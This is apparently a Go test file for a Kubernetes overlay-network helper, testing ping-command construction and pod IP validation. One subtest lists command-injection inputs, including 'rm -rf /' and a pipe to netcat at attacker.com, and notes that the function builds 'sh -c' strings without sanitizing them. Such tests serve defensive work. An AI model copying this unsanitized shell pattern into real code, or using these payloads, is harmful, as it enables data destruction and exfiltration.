package overlaytest

import (
	"context"
	"testing"

	"k8s.io/client-go/kubernetes/fake"
	"k8s.io/client-go/rest"
)

func TestCreatePingCommand(t *testing.T) {
	tests := []struct {
		name     string
		targetIP string
		expected []string
	}{
		{
			name:     "Valid IPv4 address",
			targetIP: "10.244.0.1",
			expected: []string{"sh", "-c", "ping -c 2 10.244.0.1 > /dev/null 2>&1"},
		},
		{
			name:     "Valid IPv6 address",
			targetIP: "2001:db8::1",
			expected: []string{"sh", "-c", "ping -c 2 2001:db8::1 > /dev/null 2>&1"},
		},
		{
			name:     "Localhost",
			targetIP: "127.0.0.1",
			expected: []string{"sh", "-c", "ping -c 2 127.0.0.1 > /dev/null 2>&1"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CreatePingCommand(tt.targetIP)

			if len(result) != len(tt.expected) {
				t.Errorf("Expected command length %d, got %d", len(tt.expected), len(result))
				return
			}

			for i, part := range result {
				if part != tt.expected[i] {
					t.Errorf("Expected command part %d to be %s, got %s", i, tt.expected[i], part)
				}
			}
		})
	}
}

func TestValidatePodIP(t *testing.T) {
	tests := []struct {
		name     string
		podIP    string
		expected bool
	}{
		{
			name:     "Valid IPv4 address",
			podIP:    "10.244.0.1",
			expected: true,
		},
		{
			name:     "Valid IPv6 address",
			podIP:    "2001:db8::1",
			expected: true,
		},
		{
			name:     "Localhost IPv4",
			podIP:    "127.0.0.1",
			expected: true,
		},
		{
			name:     "Localhost IPv6",
			podIP:    "::1",
			expected: true,
		},
		{
			name:     "Empty string",
			podIP:    "",
			expected: false,
		},
		{
			name:     "Invalid IP format",
			podIP:    "invalid-ip",
			expected: false,
		},
		{
			name:     "Invalid IPv4 format",
			podIP:    "256.1.1.1",
			expected: false,
		},
		{
			name:     "Partial IPv4",
			podIP:    "10.244.0",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidatePodIP(tt.podIP)
			if result != tt.expected {
				t.Errorf("Expected %t for IP %s, got %t", tt.expected, tt.podIP, result)
			}
		})
	}
}

func TestValidatePodIPEdgeCases(t *testing.T) {
	tests := []struct {
		name     string
		podIP    string
		expected bool
	}{
		{
			name:     "Zero IP",
			podIP:    "0.0.0.0",
			expected: true,
		},
		{
			name:     "Broadcast IP",
			podIP:    "255.255.255.255",
			expected: true,
		},
		{
			name:     "Multicast IP",
			podIP:    "224.0.0.1",
			expected: true,
		},
		{
			name:     "Private class A",
			podIP:    "10.0.0.1",
			expected: true,
		},
		{
			name:     "Private class B",
			podIP:    "172.16.0.1",
			expected: true,
		},
		{
			name:     "Private class C",
			podIP:    "192.168.1.1",
			expected: true,
		},
		{
			name:     "Link-local",
			podIP:    "169.254.1.1",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidatePodIP(tt.podIP)
			if result != tt.expected {
				t.Errorf("Expected %t for IP %s, got %t", tt.expected, tt.podIP, result)
			}
		})
	}
}

func TestCreatePingCommandEdgeCases(t *testing.T) {
	tests := []struct {
		name     string
		targetIP string
	}{
		{
			name:     "Empty IP",
			targetIP: "",
		},
		{
			name:     "Special characters",
			targetIP: "10.0.0.1!@#",
		},
		{
			name:     "Very long IP string",
			targetIP: "1234567890123456789012345678901234567890",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CreatePingCommand(tt.targetIP)

			if len(result) != 3 {
				t.Errorf("Expected 3 command parts, got %d", len(result))
			}

			if result[0] != "sh" {
				t.Errorf("Expected first part to be 'sh', got %s", result[0])
			}

			if result[1] != "-c" {
				t.Errorf("Expected second part to be '-c', got %s", result[1])
			}

			expectedThirdPart := "ping -c 2 " + tt.targetIP + " > /dev/null 2>&1"
			if result[2] != expectedThirdPart {
				t.Errorf("Expected third part to be %s, got %s", expectedThirdPart, result[2])
			}
		})
	}
}

func TestRunNetworkTest(t *testing.T) {
	ctx := context.Background()
	namespace := "test-namespace"

	t.Run("No pods in namespace", func(t *testing.T) {
		clientset := fake.NewSimpleClientset()
		// Provide minimal config needed for REST client
		restConfig := &rest.Config{
			Host: "https://localhost:6443",
		}

		err := RunNetworkTest(ctx, clientset, restConfig, namespace)
		if err != nil {
			t.Errorf("Expected no error with empty pod list, got: %v", err)
		}
	})

	t.Run("List pods error handling", func(t *testing.T) {
		// Test that function can be called without panicking
		// Full integration testing requires a real Kubernetes cluster
		clientset := fake.NewSimpleClientset()
		restConfig := &rest.Config{Host: "https://localhost:6443"}

		// Should handle empty pod list gracefully
		err := RunNetworkTest(ctx, clientset, restConfig, namespace)
		// No error expected with empty pod list
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
	})
}

func TestValidatePodIPComprehensive(t *testing.T) {
	t.Run("IPv4 variations", func(t *testing.T) {
		validIPv4 := []string{
			"0.0.0.0",
			"255.255.255.255",
			"192.168.1.1",
			"10.0.0.1",
			"172.16.0.1",
			"127.0.0.1",
		}

		for _, ip := range validIPv4 {
			if !ValidatePodIP(ip) {
				t.Errorf("Expected %s to be valid IPv4", ip)
			}
		}
	})

	t.Run("IPv6 variations", func(t *testing.T) {
		validIPv6 := []string{
			"::1",
			"2001:db8::1",
			"fe80::1",
			"2001:0db8:0000:0000:0000:0000:0000:0001",
			"2001:db8::8a2e:370:7334",
		}

		for _, ip := range validIPv6 {
			if !ValidatePodIP(ip) {
				t.Errorf("Expected %s to be valid IPv6", ip)
			}
		}
	})

	t.Run("Invalid formats", func(t *testing.T) {
		invalidIPs := []string{
			"",
			"not-an-ip",
			"256.1.1.1",
			"1.1.1",
			"1.1.1.1.1",
			"::gggg",
			"192.168.1.1:8080", // IP with port
			"http://192.168.1.1",
			"-1.0.0.0",
			"1.-1.0.0",
		}

		for _, ip := range invalidIPs {
			if ValidatePodIP(ip) {
				t.Errorf("Expected %s to be invalid", ip)
			}
		}
	})
}

func TestCreatePingCommandVariations(t *testing.T) {
	t.Run("Ping command structure", func(t *testing.T) {
		testIP := "192.168.1.1"
		cmd := CreatePingCommand(testIP)

		if len(cmd) != 3 {
			t.Errorf("Expected 3 parts in command, got %d", len(cmd))
		}

		if cmd[0] != "sh" {
			t.Errorf("Expected first element to be 'sh', got '%s'", cmd[0])
		}

		if cmd[1] != "-c" {
			t.Errorf("Expected second element to be '-c', got '%s'", cmd[1])
		}

		// Verify the ping command contains the IP
		if !contains(cmd[2], testIP) {
			t.Errorf("Expected ping command to contain IP %s, got '%s'", testIP, cmd[2])
		}

		// Verify it contains ping count
		if !contains(cmd[2], "-c 2") {
			t.Errorf("Expected ping command to contain '-c 2', got '%s'", cmd[2])
		}

		// Verify it redirects output
		if !contains(cmd[2], "> /dev/null 2>&1") {
			t.Errorf("Expected ping command to redirect output, got '%s'", cmd[2])
		}
	})

	t.Run("Different IP formats", func(t *testing.T) {
		ips := []string{
			"10.0.0.1",
			"192.168.1.100",
			"172.16.0.50",
			"2001:db8::1",
			"fe80::1",
		}

		for _, ip := range ips {
			cmd := CreatePingCommand(ip)
			if !contains(cmd[2], ip) {
				t.Errorf("Expected command to contain IP %s", ip)
			}
		}
	})
}

func TestNetworkEdgeCases(t *testing.T) {
	t.Run("ValidatePodIP with whitespace", func(t *testing.T) {
		ipsWithWhitespace := []string{
			" 192.168.1.1",
			"192.168.1.1 ",
			" 192.168.1.1 ",
			"\t192.168.1.1",
			"192.168.1.1\n",
		}

		for _, ip := range ipsWithWhitespace {
			// net.ParseIP handles trimming automatically
			result := ValidatePodIP(ip)
			// Some may be valid, some invalid depending on parsing
			_ = result
		}
	})

	t.Run("CreatePingCommand with injection attempts", func(t *testing.T) {
		// Test that potentially dangerous characters are passed through
		// (validation should happen elsewhere)
		dangerousInputs := []string{
			"192.168.1.1; rm -rf /",
			"192.168.1.1 && echo hacked",
			"192.168.1.1 | nc attacker.com 1234",
		}

		for _, input := range dangerousInputs {
			cmd := CreatePingCommand(input)
			// Function doesn't sanitize, it just builds the command
			// Sanitization should happen at caller level
			if len(cmd) != 3 {
				t.Errorf("Command structure changed for input %s", input)
			}
		}
	})

	t.Run("ValidatePodIP with unicode", func(t *testing.T) {
		unicodeIPs := []string{
			"192.168.１.１", // Full-width numbers
			"１９２.１６８.１.１",
			"😀192.168.1.1",
		}

		for _, ip := range unicodeIPs {
			result := ValidatePodIP(ip)
			// Should be invalid
			if result {
				t.Errorf("Expected unicode IP %s to be invalid", ip)
			}
		}
	})
}

// Helper function
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
